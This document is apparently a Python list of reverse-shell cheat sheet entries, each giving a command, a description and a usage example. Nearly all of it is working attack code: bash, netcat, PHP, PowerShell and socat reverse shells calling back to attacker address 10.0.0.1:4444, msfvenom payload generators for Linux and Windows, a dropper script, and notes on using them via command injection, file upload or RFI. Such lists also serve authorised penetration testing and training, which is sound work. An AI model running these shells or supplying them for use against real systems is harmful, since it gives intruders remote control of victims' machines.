cheats = [
    {
        "command": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
        "description": "Creates a reverse shell using bash. The target connects back to your IP and port.",
        "example": "Use in a command injection: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
    },
    {
        "command": "nc -e /bin/sh 10.0.0.1 4444",
        "description": "Netcat shell. Sends /bin/sh to the attacker's listener over TCP.",
        "example": "After setting up a listener: nc -lvnp 4444"
    },
    {
        "command": "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
        "description": "Upgrades a limited shell into a fully interactive TTY shell.",
        "example": "Run after getting a shell: python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    },
    {
        "command": "msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf",
        "description": "Generates a Linux reverse shell binary using Metasploit's msfvenom.",
        "example": "Compile for Linux targets: chmod +x shell.elf && ./shell.elf"
    },
    {
        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe",
        "description": "Creates a Windows Meterpreter payload. Use with Metasploit handler.",
        "example": "Run: ./shell.exe after setting up multi/handler"
    },
    {
        "command": "php -r '$sock=fsockopen(\"10.0.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "description": "PHP reverse shell. Useful in file upload or RFI vulnerabilities.",
        "example": "Inject in vulnerable PHP param or upload as shell.php"
    },
    {
        "command": "powershell -nop -c \"$client = New-Object Net.Sockets.TCPClient('10.0.0.1',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"",
        "description": "PowerShell reverse shell for Windows targets. Long but effective.",
        "example": "Use in Windows RCE or scheduled tasks"
    },
    {
        "command": "socat TCP:10.0.0.1:4444 EXEC:/bin/sh",
        "description": "Reverse shell using socat. Less common but reliable.",
        "example": "Target runs this, attacker listens on TCP port"
    },
    {
        "command": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > shell.sh",
        "description": "Writes a basic reverse shell to a script file.",
        "example": "Useful for droppers: bash shell.sh"
    },
    {
        "command": "openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes",
        "description": "Generates self-signed SSL cert. Useful for HTTPS payload hosting.",
        "example": "Use with Python HTTPS server or secure reverse shell"
    }
]
